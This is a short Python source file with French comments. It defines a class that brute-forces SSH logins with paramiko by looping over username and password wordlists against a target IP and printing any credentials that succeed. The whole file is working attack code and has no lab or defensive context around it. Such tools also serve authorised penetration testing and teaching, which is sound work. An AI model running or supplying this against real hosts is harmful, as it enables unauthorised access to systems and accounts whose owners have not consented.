import paramiko

"""
Le fichier Bruteforce.py contient la classe Bruteforce, qui effectue des tentatives d'attaque par force brute sur les hôtes 
avec le service SSH (port 22). La classe utilise les bibliothèques Paramiko pour se connecter en SSH et teste 
différentes combinaisons d'utilisateurs et de mots de passe à partir des fichiers spécifiés. Les résultats de l'attaque par force brute 
sont affichés à l'utilisateur.
"""


class Bruteforce_ssh:
    def __init__(self, ip_address, username_file, password_file):
        self.ip_address = ip_address
        self.username_list = self._read_file(username_file)
        self.password_list = self._read_file(password_file)
        self.ssh = paramiko.SSHClient()
        self.ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        self.found = False

    # Méthode pour lancer la tentative de bruteforce
    def start(self):
        for username in self.username_list:
            for password in self.password_list:
                result = self._bruteforce(username.strip(), password.strip())
                if result:
                    return result

        if not self.found:
            return f"Bruteforce failed for {self.ip_address}"

    # Méthode pour essayer un couple identifiant/mot de passe
    def _bruteforce(self, username, password):
        if self.found:
            return

        try:
            self.ssh.connect(self.ip_address, username=username, password=password, timeout=10)
            self.found = True
            return f"Found credentials for {self.ip_address}: {username}/{password}"
        except:
            pass
        finally:
            self.ssh.close()

    # Méthode pour lire les wordlists et retourner son contenu sous forme de liste
    @staticmethod
    def _read_file(file_path):
        with open(file_path, "r") as file:
            return file.readlines()

